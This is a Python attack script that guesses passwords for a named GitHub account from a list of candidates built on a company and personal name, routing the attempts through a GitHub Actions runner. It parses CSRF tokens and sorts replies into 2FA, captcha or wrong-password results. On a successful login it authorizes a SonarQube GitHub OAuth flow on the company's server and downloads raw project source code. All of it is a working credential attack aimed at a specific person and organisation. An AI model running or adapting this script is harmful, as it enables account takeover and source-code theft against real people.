#!/usr/bin/env python3
"""ct49: owner GitHub password probe on a clean GHA egress + SonarQube OAuth dump if session obtained."""
import json, os, re, subprocess, sys, time

CANDS = ["Cardtonic2025!", "Adelekeadenijio@2025", "Adelekeadenijio@2026", "Thetonictech@2024", "Cardtonic123", "Cardtonic.#1", "A4@cardtonic", "thetonictech", "Xardtonicmmeru1@", "Computer7,", "Password1#,"]
LOGIN = os.environ.get("GH_LOGIN", "eazylaykzy")
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
      "Chrome/131.0.0.0 Safari/537.36")
OUT = "out2"
os.makedirs(OUT, exist_ok=True)
try:
    import requests
except Exception:
    subprocess.run([sys.executable, "-m", "pip", "install", "--quiet", "requests"])
    import requests


def log(*a, **kw):
    print(*a, flush=True)


def egress():
    out = {}
    for u in ("https://ifconfig.me/ip", "https://api.ipify.org", "https://ipinfo.io/json"):
        try:
            out[u] = requests.get(u, timeout=15).text[:300]
        except Exception as e:
            out[u] = "ERR " + str(e)[:80]
    return out


def new_session():
    s = requests.Session()
    s.headers.update({"User-Agent": UA, "Accept-Language": "en-US,en;q=0.9",
                      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"})
    return s


def classify_login(r2):
    rec = {"status": r2.status_code, "location": r2.headers.get("Location"),
           "setcookie": [c.name for c in r2.cookies]}
    if r2.status_code in (301, 302, 303):
        loc = r2.headers.get("Location", "")
        if "two-factor" in loc:
            rec["verdict"] = "2FA"
        elif "login/oauth" in loc or "session" in loc:
            rec["verdict"] = "REDIRECT:" + loc[:120]
        else:
            rec["verdict"] = "SUCCESS"
        return rec
    t = r2.text
    flags = []
    for key in ["Incorrect username or password", "There have been several failed",
                "verify your account", "captcha", "suspended", "rate limit", "too many"]:
        if key.lower() in t.lower():
            flags.append(key)
    rec["flags"] = flags
    fm = re.findall(r'class="flash[^"]*"[^>]*>(.*?)</div>', t, re.S)
    rec["flash"] = [re.sub(r"<[^>]+>", "", x).strip()[:200] for x in fm[:3]]
    if any("There have been several failed" in f for f in flags):
        rec["verdict"] = "CAPTCHA"
    elif any("Incorrect username or password" in f for f in flags):
        rec["verdict"] = "WRONG_PASSWORD"
    elif any("suspended" in f.lower() for f in flags):
        rec["verdict"] = "SUSPENDED"
    else:
        rec["verdict"] = "UNKNOWN"
    return rec


def sonar_dump(s):
    """Walk SonarQube GitHub-OAuth with the authenticated github session; dump project sources."""
    out = {"steps": []}
    try:
        r = s.get("https://sonarci.cardtonic.com/sessions/init/github?return_to=%2F",
                  allow_redirects=True, timeout=40)
        out["steps"].append({"url": "sessions/init/github", "final": r.url[:200],
                             "status": r.status_code, "len": len(r.text)})
        if "/login/oauth/authorize" in r.url:
            m = re.search(r'name="authenticity_token" value="([^"]+)"', r.text)
            if m:
                data = {"authenticity_token": m.group(1).replace("&amp;", "&"), "authorize": "1"}
                for k in ("client_id", "redirect_uri", "scope", "state"):
                    mm = re.search(r'name="%s" value="([^"]*)"' % k, r.text)
                    if mm:
                        data[k] = mm.group(1).replace("&amp;", "&")
                r2 = s.post("https://github.com/login/oauth/authorize", data=data,
                            allow_redirects=True, timeout=40)
                out["steps"].append({"url": "oauth/authorize POST", "final": r2.url[:200],
                                     "status": r2.status_code, "len": len(r2.text)})
        v = s.get("https://sonarci.cardtonic.com/api/authentication/validate", timeout=40)
        out["validate"] = {"status": v.status_code, "body": v.text[:300]}
        comp = s.get("https://sonarci.cardtonic.com/api/components/search?qualifiers=TRK&ps=500",
                     timeout=60)
        out["components_status"] = comp.status_code
        keys = []
        try:
            keys = [c["key"] for c in comp.json().get("components", [])]
        except Exception:
            out["components_body"] = comp.text[:400]
        out["keys"] = keys[:25]
        os.makedirs(OUT + "/sonar_src", exist_ok=True)
        total = 0
        for k in out["keys"]:
            try:
                rr = s.get("https://sonarci.cardtonic.com/api/sources/raw",
                           params={"key": k}, timeout=90)
                body = rr.text
                fn = OUT + "/sonar_src/" + re.sub(r"[^A-Za-z0-9._-]", "_", k) + ".txt"
                open(fn, "w").write(body)
                total += len(body)
                log("[sonar]", k, rr.status_code, len(body))
            except Exception as e:
                log("[sonar-err]", k, str(e)[:120])
        out["sources_bytes"] = total
    except Exception as e:
        out["err"] = f"{type(e).__name__}: {str(e)[:300]}"
    return out


def main():
    res = {"login": LOGIN, "egress": egress(), "attempts": [], "verdict": None, "session": None}
    log("EGRESS", json.dumps(res["egress"])[:300])
    for pw in CANDS:
        s = new_session()
        rec = {"pw": pw}
        try:
            r = s.get("https://github.com/login", timeout=30)
            m = re.search(r'name="authenticity_token" value="([^"]+)"', r.text)
            if not m:
                rec["verdict"] = "NO_TOKEN"
                res["attempts"].append(rec)
                break
            tok = m.group(1).replace("&amp;", "&")
            time.sleep(3)
            r2 = s.post("https://github.com/session",
                        data={"commit": "Sign in", "authenticity_token": tok, "login": LOGIN,
                              "password": pw, "webauthn-conditional": "undefined",
                              "javascript-support": "true", "webauthn-support": "supported"},
                        allow_redirects=False, timeout=40)
            rec.update(classify_login(r2))
        except Exception as e:
            rec["verdict"] = "ERR"
            rec["err"] = f"{type(e).__name__}:{str(e)}"[:200]
        res["attempts"].append(rec)
        log("=== gh", pw, "->", rec.get("verdict"), rec.get("flags"), flush=True)
        if rec.get("verdict") in ("SUCCESS", "2FA"):
            res["verdict"] = rec["verdict"]
            res["cookies"] = sorted({c.name for c in s.cookies})
            res["sonar"] = sonar_dump(s)
            break
        if rec.get("verdict") == "CAPTCHA" and rec.get("flags") and pw != CANDS[-1]:
            # octocaptcha: stop this run; remaining candidates unexplored
            res["stopped_at"] = pw
            break
        time.sleep(2)
    if res["verdict"] is None:
        res["verdict"] = res["attempts"][-1].get("verdict") if res["attempts"] else "NO_ATTEMPTS"
    json.dump(res, open(OUT + "/results.json", "w"), indent=1)
    open(OUT + "/summary.txt", "w").write(json.dumps({
        "login": LOGIN, "egress": res["egress"], "verdict": res["verdict"],
        "attempts": [[a.get("pw"), a.get("verdict"), a.get("flags")] for a in res["attempts"]],
        "sonar_keys": (res.get("sonar") or {}).get("keys"),
    }, indent=1)[:60000])
    log("SUMMARY", json.dumps({"verdict": res["verdict"],
        "attempts": [[a.get("pw"), a.get("verdict")] for a in res["attempts"]]}, ensure_ascii=False))


main()
